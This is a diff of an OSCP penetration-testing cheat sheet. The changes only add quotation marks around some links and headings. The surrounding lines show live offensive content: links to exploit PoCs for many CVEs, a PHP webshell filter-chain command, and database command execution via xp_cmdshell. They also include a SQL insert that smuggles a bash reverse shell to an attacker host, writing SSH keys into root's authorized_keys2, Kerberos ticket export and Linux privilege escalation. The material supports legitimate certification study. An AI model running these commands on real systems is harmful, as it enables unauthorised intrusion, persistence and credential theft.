@@ -194,10 +194,10 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | fpmvuln | https://github.com/hannob/fpmvuln |
 | Gobuster | https://github.com/OJ/gobuster |
 | JSON Web Tokens | https://jwt.io |
-| JWT_Tool | https://github.com/ticarpi/jwt_tool |
+| "JWT_Tool" | "https://github.com/ticarpi/jwt_tool" |
 | Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
-| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
+| PHP Filter Chain Generator | "https://github.com/synacktiv/php_filter_chain_generator" |
 | PHPGGC | https://github.com/ambionics/phpggc |
 | Spose | https://github.com/aancw/spose |
 | Wfuzz | https://github.com/xmendez/wfuzz |
@@ -211,7 +211,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | --- | --- |
 | CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
 | Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
-| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
+| Firefox Decrypt | "https://github.com/unode/firefox_decrypt" |
 | hashcat | https://hashcat.net/hashcat |
 | Hydra | https://github.com/vanhauser-thc/thc-hydra |
 | John | https://github.com/openwall/john |
@@ -266,7 +266,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
 | GTFOBins | https://gtfobins.github.io |
 | Impacket | https://github.com/fortra/impacket |
-| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
+| Impacket Static Binaries | "https://github.com/ropnop/impacket_static_binaries" |
 | JAWS | https://github.com/411Hall/JAWS |
 | KrbRelay | https://github.com/cube0x0/KrbRelay |
 | KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
@@ -337,8 +337,8 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
 | CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
 | CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
-| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
-| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
+| CVE-2019-7304 | "dirty_sock LPE" | "https://github.com/initstring/dirty_sock" |
+| CVE-2020-0796 | SMBGhost RCE PoC | "https://github.com/chompie1337/SMBGhost_RCE_PoC" |
 | CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
 | CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
 | CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
@@ -351,7 +351,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
 | CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
 | CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
-| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
+| CVE-2021-3129 | Laravel Framework RCE | "https://github.com/nth347/CVE-2021-3129_exploit" |
 | CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
 | CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
 | CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
@@ -365,7 +365,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
 | CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
 | CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
-| CVE-2021-40444 | MSHTML builders RCE | https://github.com/aslitsecurity/CVE-2021-40444_builders |
+| CVE-2021-40444 | MSHTML builders RCE | "https://github.com/aslitsecurity/CVE-2021-40444_builders" |
 | CVE-2021-40444 | MSHTML Exploit RCE | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
 | CVE-2021-40444 | MSHTML RCE PoC | https://github.com/lockedbyte/CVE-2021-40444 |
 | CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
@@ -392,14 +392,14 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
 | CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
 | CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
-| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
+| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | "https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768" |
 | CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
 | CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
-| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
+| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) | "https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY" |
 | CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
 | CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
-| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
-| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
+| CVE-2023-25690 | "Apache mod_proxy HTTP Request Smuggling PoC" | https://github.com/dhmosfunk/CVE-2023-25690-POC |
+| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | "https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce" |
 | CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
 | CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
 | CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
@@ -446,7 +446,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | phpgcc | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
 | PowerLine | https://github.com/fullmetalcache/powerline |
-| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows](https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')) |
+| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows]("https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')") |
 | Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
 | ScareCrow | https://github.com/optiv/ScareCrow |
 | Shikata Ga Nai | https://github.com/EgeBalci/sgn |
@@ -466,7 +466,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | CeWL | https://github.com/digininja/cewl |
 | COOK | https://github.com/giteshnxtlvl/cook |
 | CUPP | https://github.com/Mebus/cupp |
-| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
+| Kerberos Username Enumeration | "https://github.com/attackdebris/kerberos_enum_userlists" |
 | SecLists | https://github.com/danielmiessler/SecLists |
 
 ### Social Media Resources
@@ -1711,7 +1711,7 @@ mv <FILE>.jpg <FILE>.php\x00.jpg
 
 #### PHP Filter Chain Generator
 
-> https://github.com/synacktiv/php_filter_chain_generator
+> "https://github.com/synacktiv/php_filter_chain_generator"
 
 ```c
 python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
@@ -1983,7 +1983,7 @@ mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_
 mysql> \! /bin/sh
 ```
 
-##### xp_cmdshell
+##### "xp_cmdshell"
 
 ```c
 SQL> EXEC sp_configure 'Show Advanced Options', 1;
@@ -2005,7 +2005,7 @@ SQL> xp_cmdshell whoami
 mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
 ```
 
-##### Write SSH Key into authorized_keys2 file
+##### "Write SSH Key into authorized_keys2 file"
 
 ```c
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
@@ -2317,7 +2317,7 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 
 > https://hashcat.net/cap2hashcat/
 
-> https://hashcat.net/wiki/doku.php?id=example_hashes
+> "https://hashcat.net/wiki/doku.php?id=example_hashes"
 
 ```c
 hashcat --example-hashes
@@ -2380,7 +2380,7 @@ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c
 
 ##### Rules
 
-> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule
+> "https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule"
 
 ##### Cracking with OneRuleToRuleThemAll.rule
 
@@ -2944,7 +2944,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 $ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
 ```
 
-###### Fixing msada_guids Error
+###### "Fixing msada_guids Error"
 
 ```c
 #from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
@@ -2953,7 +2953,7 @@ from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
 
 Then put the `msada_guids.py` into the same directory as `dacledit.py`
 
-> https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py
+> "https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py"
 
 ##### owneredit.py
 
@@ -3109,9 +3109,9 @@ sekurlsa::tickets /export
 [IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
 ```
 
-###### Convert Tickets between Linux and Windows Format with ticket_converter.py
+###### "Convert Tickets between Linux and Windows Format with ticket_converter.py"
 
-> https://github.com/Zer1t0/ticket_converter
+> "https://github.com/Zer1t0/ticket_converter"
 
 ```c
 python ticket_converter.py ticket.kirbi ticket.ccache
@@ -3386,9 +3386,9 @@ export -f /usr/sbin/<BINARY>
 /usr/sbin/<BINARY>
 ```
 
-##### LD_PRELOAD
+##### "LD_PRELOAD"
 
-> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+> "https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/"
 
 ###### shell.c
 
@@ -3430,7 +3430,7 @@ gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles
 sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
 ```
 
-##### LD_LIBRARY_PATH
+##### "LD_LIBRARY_PATH"
 
 ###### Get Information about Libraries
 
@@ -3532,7 +3532,7 @@ gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
 
 ##### Wildcards
 
-> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+> "https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt"
 
 With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
 Instead of an option, it creates a file, named `--checkpoint=1`.
@@ -3820,7 +3820,7 @@ reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\
 
 > https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09
 
-> https://www.nirsoft.net/utils/credentials_file_view.html
+> "https://www.nirsoft.net/utils/credentials_file_view.html"
 
 ```c
 cmdkey /list
